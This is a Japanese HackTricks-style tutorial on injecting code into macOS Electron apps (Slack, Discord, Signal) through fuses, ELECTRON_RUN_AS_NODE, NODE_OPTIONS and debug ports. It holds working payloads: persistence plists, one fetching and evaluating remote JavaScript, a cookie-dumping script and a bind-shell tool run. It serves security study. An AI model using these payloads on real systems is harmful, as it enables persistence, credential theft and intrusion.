# macOS Electron アプリケーションインジェクション

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## 基本情報

Electronについて知らない場合は、[**こちらで多くの情報を見つけることができます**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps)。しかし、今のところElectronが**node**を実行することだけを知っておいてください。\
そしてnodeには、指定されたファイル以外の**他のコードを実行させる**ために使用できる**パラメータ**と**環境変数**があります。

### Electron ヒューズ

これらのテクニックについては後で議論されますが、最近Electronはそれらを防ぐためのいくつかの**セキュリティフラグを追加しました**。これらは[**Electron ヒューズ**](https://www.electronjs.org/docs/latest/tutorial/fuses)であり、macOSのElectronアプリが**任意のコードをロードするのを防ぐ**ために使用されるものです：

* **`RunAsNode`**: 無効にすると、環境変数**`ELECTRON_RUN_AS_NODE`**を使用してコードをインジェクトすることを防ぎます。
* **`EnableNodeCliInspectArguments`**: 無効にすると、`--inspect`や`--inspect-brk`のようなパラメータは尊重されません。この方法でコードをインジェクトすることを避けます。
* **`EnableEmbeddedAsarIntegrityValidation`**: 有効にすると、ロードされた**`asar`** **ファイル**はmacOSによって**検証されます**。この方法で、このファイルの内容を変更して**コードインジェクションを防ぎます**。
* **`OnlyLoadAppFromAsar`**: これが有効になっている場合、**`app.asar`**、**`app`**、最後に**`default_app.asar`**の順にロードするのではなく、app.asarのみをチェックして使用します。これにより、**`embeddedAsarIntegrityValidation`** ヒューズと**組み合わせる**ことで、**検証されていないコードをロードすることが不可能**になります。
* **`LoadBrowserProcessSpecificV8Snapshot`**: 有効にすると、ブラウザプロセスは`browser_v8_context_snapshot.bin`というファイルをV8スナップショットに使用します。

コードインジェクションを防ぐことはないが興味深いヒューズもあります：

* **EnableCookieEncryption**: 有効にすると、ディスク上のクッキーストアはOSレベルの暗号化キーを使用して暗号化されます。

### Electron ヒューズの確認

アプリケーションからこれらのフラグを**確認する**には：
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Electron Fuses の変更

[**ドキュメントに記載されているように**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode)、**Electron Fuses** の設定は **Electron バイナリ** 内に配置されており、どこかに文字列 **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** が含まれています。

macOS アプリケーションでは、これは通常 `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework` にあります。
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
このファイルを[https://hexed.it/](https://hexed.it/)で読み込んで、前の文字列を探します。この文字列の後にASCIIで数字の「0」または「1」が見え、それぞれのヒューズが無効か有効かを示しています。ヒューズの値を**変更する**ためには、16進コード（`0x30`は`0`、`0x31`は`1`）を変更します。

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

アプリケーション内の**`Electron Framework` バイナリ**をこれらのバイトで上書きしようとすると、アプリは実行されないことに注意してください。

## Electron アプリケーションにコードを追加して RCE を実行

Electron アプリが使用している**外部の JS/HTML ファイル**があるため、攻撃者はこれらのファイルにコードを注入し、アプリのコンテキストで任意のコードを実行することができます。これらのファイルの署名はチェックされません。

{% hint style="danger" %}
ただし、現時点で2つの制限があります：

* アプリを変更するためには **`kTCCServiceSystemPolicyAppBundles`** の権限が**必要**ですが、デフォルトではこれはもはや可能ではありません。
* コンパイルされた **`asap`** ファイルには通常、ヒューズ **`embeddedAsarIntegrityValidation`** `と` **`onlyLoadAppFromAsar`** が`有効`になっています。

これにより攻撃経路がより複雑になる（または不可能になる）。
{% endhint %}

**`kTCCServiceSystemPolicyAppBundles`** の要件をバイパスする方法として、アプリケーションを別のディレクトリ（例えば **`/tmp`**）にコピーし、フォルダ **`app.app/Contents`** を **`app.app/NotCon`** にリネームし、**asar** ファイルを**悪意のある**コードで**変更**し、それを元に戻して **`app.app/Contents`** とリネームし、実行する方法があります。

asar ファイルからコードをアンパックするには：
```bash
npx asar extract app.asar app-decomp
```
変更した後、以下のコマンドで再びパックします:
```bash
npx asar pack app-decomp app-new.asar
```
## `ELECTRON_RUN_AS_NODE` を利用した RCE <a href="#electron_run_as_node" id="electron_run_as_node"></a>

[**ドキュメント**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node)によると、この環境変数が設定されている場合、通常の Node.js プロセスとしてプロセスが開始されます。

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
もし **`RunAsNode`** フューズが無効になっている場合、環境変数 **`ELECTRON_RUN_AS_NODE`** は無視され、この方法は機能しません。
{% endhint %}

### App Plistからのインジェクション

[**ここで提案されているように**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/)、plist内のこの環境変数を悪用して永続性を維持することができます：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## `NODE_OPTIONS`を使用したRCE

ペイロードを別のファイルに保存して実行することができます：

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
もし **`EnableNodeOptionsEnvironmentVariable`** フューズが**無効**になっている場合、アプリは環境変数 **NODE\_OPTIONS** を無視します。ただし、環境変数 **`ELECTRON_RUN_AS_NODE`** が設定されている場合はこの限りではありませんが、フューズ **`RunAsNode`** が無効になっている場合は、これも**無視**されます。

**`ELECTRON_RUN_AS_NODE`** を設定しない場合、次のような**エラー**が表示されます：`Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
{% endhint %}

### アプリPlistからのインジェクション

plist内のこの環境変数を悪用して、以下のキーを追加することで永続性を維持することができます：
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCEを検査する

[**こちらの記事**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)によると、**`--inspect`**、**`--inspect-brk`**、**`--remote-debugging-port`** などのフラグを付けてElectronアプリケーションを実行すると、**デバッグポートが開かれ**、それに接続できるようになります（例えばChromeの `chrome://inspect` から）。そして、**コードを注入したり**、新しいプロセスを起動することができます。\
例えば：

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
もしfuse**`EnableNodeCliInspectArguments`**が無効になっている場合、アプリは**`--inspect`**などのnodeパラメータを無視します（環境変数**`ELECTRON_RUN_AS_NODE`**が設定されている場合を除く）。また、fuse **`RunAsNode`**が無効になっている場合は、**`ELECTRON_RUN_AS_NODE`**も無視されます。

しかし、**electronパラメータ`--remote-debugging-port=9229`**を使用することは可能ですが、以前のペイロードは他のプロセスを実行するためには機能しません。
{% endhint %}

パラメータ**`--remote-debugging-port=9222`**を使用すると、Electronアプリから**履歴**（GETコマンドを使用して）やブラウザの**クッキー**（ブラウザ内で**復号化**され、それらを提供する**jsonエンドポイント**があるため）などの情報を盗むことが可能です。

その方法については[**こちら**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)と[**こちら**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)で学ぶことができ、自動ツール[WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut)やシンプルなスクリプトを使用することができます。
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
In [**このブログポスト**](https://hackerone.com/reports/1274695)では、このデバッグ機能が悪用され、headless chromeに**任意の場所に任意のファイルをダウンロード**させることができます。

### App Plistからのインジェクション

plist内のこの環境変数を悪用して、これらのキーを追加することで永続性を維持できます：
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## 古いバージョンを悪用したTCCバイパス

{% hint style="success" %}
macOSのTCCデーモンは、実行されるアプリケーションのバージョンをチェックしません。したがって、以前の技術で**Electronアプリケーションにコードを注入できない**場合、以前のバージョンのAPPをダウンロードして、TCC権限を得ながらコードを注入することができます（ただし、Trust Cacheがそれを防いでいない限り）。
{% endhint %}

## JS以外のコードの実行

前述の技術を使用すると、**Electronアプリケーションのプロセス内でJSコードを実行**できます。しかし、**子プロセスは親アプリケーションと同じサンドボックスプロファイルの下で実行され**、TCC権限を**継承します**。\
したがって、例えばカメラやマイクへのアクセス権を悪用したい場合は、**プロセスから別のバイナリを実行**するだけでよいです。

## 自動注入

ツール[**electroniz3r**](https://github.com/r3ggi/electroniz3r)は、インストールされている**脆弱なElectronアプリケーションを簡単に見つけて**コードを注入するために使用できます。このツールは**`--inspect`**技術を使用しようとします：

自分でコンパイルして、次のように使用できます：
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## 参考文献

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローしてください。**
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有してください。**

</details>
